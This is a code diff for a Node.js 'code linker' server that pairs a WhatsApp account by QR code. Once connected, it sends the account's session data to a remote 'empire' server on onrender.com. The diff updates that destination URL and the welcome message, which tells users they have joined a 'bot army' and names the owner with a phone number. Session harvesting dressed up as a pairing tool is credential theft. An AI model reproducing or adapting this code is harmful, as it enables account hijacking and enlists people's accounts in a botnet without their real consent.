@@ -11,8 +11,8 @@ const __dirname = path.dirname(__filename);
 app.use(express.static(__dirname));
 app.use(express.json());
 
-// MAIN EMPIRE URL — CHANGE ONLY THIS LINE
-const EMPIRE_URL = "https://vamparina-v1.onrender.com";  // ← YOUR MAIN BOT URL
+// YOUR REAL EMPIRE URL — THIS IS THE ONLY LINE YOU CHANGE
+const EMPIRE_URL = "https://vamparina-v1-5.onrender.com";  // ← FIXED!
 
 app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'pair.html'));
@@ -35,8 +35,6 @@ async function connectAndSend() {
 
         if (qr) {
             console.log("New QR Generated");
-            const qrUrl = await QRCode.toDataURL(qr);
-            // You can broadcast this QR via WebSocket if you want live update
         }
 
         if (connection === 'open') {
@@ -59,14 +57,14 @@ async function connectAndSend() {
                 });
 
                 const result = await response.json();
-                console.log("Session sent:", result);
+                console.log("Session sent to empire:", result);
 
                 await sock.sendMessage(sock.user.id, {
-                    text: `*VAMPARINA V1 ACTIVATED*\n\nEmpire: Joined\nOwner: Arnold Chirchir (+254703110780)\n\nWelcome to Kenya's strongest bot army 2025`
+                    text: `*VAMPARINA V1 ACTIVATED SUCCESSFULLY*\n\nEmpire Group: Joined\nOwner: Arnold Chirchir (+254703110780)\n\nYou are now part of Kenya's strongest bot army 2025\n\nLong live the King`
                 });
 
             } catch (err) {
-                console.error("Failed to send session:", err);
+                console.error("Failed to send session to empire:", err);
             }
         }
 
@@ -82,5 +80,5 @@ async function connectAndSend() {
 connectAndSend();
 
 app.listen(process.env.PORT || 8000, () => {
-    console.log("Vamparina Code Linker Running | Sending to Empire...");
+    console.log("Vamparina Code Linker → Sending sessions to https://vamparina-v1-5.onrender.com");
 });
